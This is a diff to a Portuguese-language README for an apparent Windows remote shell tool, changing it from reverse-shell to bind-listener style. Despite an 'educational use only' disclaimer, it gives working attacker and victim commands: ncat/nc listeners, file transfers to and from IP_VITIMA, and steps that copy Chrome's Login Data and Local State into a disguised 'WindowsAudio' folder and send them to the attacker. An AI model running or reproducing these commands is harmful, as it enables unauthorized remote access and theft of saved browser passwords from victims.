@@ -1,4 +1,4 @@
-# 🖥️ Shell Reverso - Windows Promt de Comando
+# 🖥️ Shell cmd.exe - Windows Promt de Comando
 
 ⚠️ **Aviso**
 Este projeto é apenas para **fins educacionais e testes autorizados**. O uso indevido é de total responsabilidade do usuário.
@@ -42,10 +42,10 @@ OBS: Após executar o Install_Shell_Reverse.bat e obter acesso à shell, recomen
 ### 2. No atacante
 ```bash
 # Windows (via ncat)
-ncat -lnvp 5575
+ncat -lnvp 65534
 
 # Linux (via nc)
-nc -lnvp 5575
+nc -lnvp 65534
 ```
 
 ---
@@ -75,12 +75,12 @@ rmdir /s /q "%USERPROFILE%\WindowsAudio"
 
 **No shell Windows conectado:**
 ```cmd
-ncat SEU_IP_PUBLICO 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
+ncat -lnp 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
 ```
 
 **No Linux (outro terminal):**
 ```bash
-ncat -lnvp 5581 < /caminho/do/arquivo.jpg
+nc IP_VITIMA 5581 < /caminho/do/arquivo.jpg
 ```
 
 ---
@@ -127,24 +127,24 @@ copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "%USERPRO
 
 **No Windows (shell conectado):**
 ```cmd
-ncat -SEU_IP_PUBLICO 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
+ncat -lnp 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
 ```
 
 **No Linux (outro terminal):**
 ```bash
-ncat -lnvp 5581 > LoginData.db
+ncat IP_VITIMA 5581 > LoginData.db
 ```
 
 **Repita para o LocalState (use porta 5582):**
 
 **No Windows:**
 ```cmd
-ncat SEU_IP_PUBLICO 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
+ncat -lnp 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
 ```
 
 **No Linux:**
 ```bash
-ncat -lnvp 5582 > LocalState.json
+ncat IP_VITIMA 5582 > LocalState.json
 ```
 
 ### 3. Instalar dependência no Linux
